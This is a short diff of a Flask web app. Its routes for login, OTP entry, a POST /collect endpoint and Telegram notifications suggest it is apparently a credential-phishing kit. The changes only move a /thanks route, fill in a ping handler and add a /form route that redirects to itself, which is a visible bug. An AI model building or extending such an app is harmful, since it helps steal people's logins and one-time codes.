@@ -65,10 +65,7 @@ def login():
 @app.route('/otp')
 def otp():
     return render_template('otp.html')
-    
-@app.route('/thanks')
-def thanks():
-    return render_template('thanks.html')             
+                
     
 @app.route('/collect', methods=['POST'])
 def collect():
@@ -164,12 +161,11 @@ def notify(text: str) -> bool:
        
 @app.get("/ping")
 def ping():
-       pass
+       return "pong", 200
 
 @app.get("/form")
 def form_page():  
-       
-       pass     
+             return redirect("/form")     
 
 @app.get("/")
 def root():
@@ -240,6 +236,10 @@ def submit():
             CHAT_ID = os.getenv("TG_CHAT_ID")
         except Exception as e:
             print("log write error:", e)
+            
+@app.route('/thanks')
+def thanks():
+    return render_template('thanks.html')            
 
 @app.route("/test-notify")
 def test_notify():
